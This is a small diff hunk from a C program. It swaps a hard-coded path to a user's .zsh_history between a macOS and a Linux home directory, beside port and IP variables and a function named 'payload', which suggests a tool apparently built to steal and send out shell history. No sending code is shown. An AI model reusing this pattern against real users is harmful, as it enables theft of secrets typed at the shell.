@@ -17,7 +17,7 @@
 uint16_t port = 0;
 uint32_t addr_ip = 0;
 // char path[PATH_MAX] = "/home/maxence/.zsh_history";
-char path[PATH_MAX] = "/Users/maxencegama/.zsh_history";
+char path[PATH_MAX] = "/home/maxence/.zsh_history";
 
 void payload(void)
 {
